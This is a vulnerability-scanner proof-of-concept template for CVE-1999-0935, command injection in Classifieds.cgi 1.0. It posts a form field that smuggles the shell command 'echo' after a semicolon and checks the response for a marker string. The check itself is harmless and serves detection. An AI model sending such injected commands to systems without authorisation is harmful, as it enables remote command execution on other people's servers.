[info]
author = "ave"
description = "Classifieds.cgi 1.0 在处理 CGI 表单时未对隐藏变量中的内容进行安全过滤，远程攻击者可通过构造包含 shell 命令的隐藏变量实现任意命令执行。本 PoC 通过提交包含隐藏变量的表单并检测命令执行回显来验证漏洞是否存在，仅做无害的命令回显验证。"
id = "POC-AVE-1999-1314"
name = "CVE-1999-0935 Classifieds.cgi 1.0 隐藏变量远程命令执行 PoC"
severity = "critical"
tags = ["ave-1999-1314"]
vuln_id = [
    "CVE-1999-0935",
    "AVE-1999-1314",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/classifieds.cgi"
protocol = "http"

[poc.requests.body]
content = "cmd=test;echo AVE_POC_MARKER_19990935"
type = "form"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVE_POC_MARKER_19990935"]
